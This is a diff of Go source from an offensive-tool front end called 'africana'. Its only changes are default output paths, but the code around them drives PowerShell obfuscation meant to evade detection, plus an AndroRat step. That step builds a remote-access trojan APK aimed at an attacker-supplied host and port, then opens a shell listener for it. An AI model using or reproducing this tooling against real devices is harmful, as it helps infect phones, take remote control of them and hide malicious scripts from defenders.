@@ -49,12 +49,12 @@ func Chameleon() {
     fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")\n" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     fmt.Scan(&userScript)
-    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/outputs/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     userOutput, _ := reader.ReadString('\n')
     userOutput = strings.TrimSpace(userOutput)
     if userOutput == "" {
-        userOutput = "/root/.africana/output/leviathan.txt"
+        userOutput = "/root/.africana/outputs/leviathan.txt"
     }
     subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; python3 chameleon.py -a %s -o %s`, userScript, userOutput); fmt.Println()
 }
@@ -63,12 +63,12 @@ func Gh0x0st() {
     fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")\n" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     fmt.Scan(&userScript)
-    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/outputs/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     userOutput, _ := reader.ReadString('\n')
     userOutput = strings.TrimSpace(userOutput)
     if userOutput == "" {
-        userOutput = "/root/.africana/output/levuathan.txt"
+        userOutput = "/root/.africana/outputs/levuathan.txt"
     }
     subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput); fmt.Println()
 }
@@ -170,12 +170,12 @@ func AndroRat() {
     if userMalware == "" {
         userMalware = "africana.apk"
     }
-    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/outputs/" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     userOutput, _ := reader.ReadString('\n')
     userOutput = strings.TrimSpace(userOutput)
     if userOutput == "" {
-        userOutput = "/root/.africana/output/"
+        userOutput = "/root/.africana/outputs/"
     }
     subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --build -i %s -p %s -o %s`, userLhost, userLport, userOutput + userMalware + ".apk")
     subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport); fmt.Println()
